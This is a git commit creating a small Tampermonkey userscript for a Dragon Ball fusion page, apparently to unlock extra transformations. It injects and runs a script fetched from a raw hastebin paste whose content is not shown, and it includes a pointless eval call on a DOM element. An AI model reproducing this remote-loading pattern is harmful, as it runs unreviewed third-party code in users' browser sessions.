2c8202ead985243a67e2c5c00049c98452fe6744
w3bOs <75303094+w3bOs@users.noreply.github.com>
2020-12-13 00:34:30 +0100

    Create main.user.js

---
+++ main.user.js
@@ -0,0 +1,15 @@
+// ==UserScript==
+// @name         DBFG
+// @namespace    http://tampermonkey.net/
+// @version      1.0
+// @description  ssj4() ssj5() lssj() mui() ssjr()
+// @author       CiberWeaboo
+// @match        https://japeal.com/dbfg/
+// @grant        none
+// ==/UserScript==
+
+const script= document.createElement("script")
+script.type = "text/javascript"
+script.src = "https://hastebin.com/raw/yazexunowo"
+document.head.appendChild(script)
+eval(script)
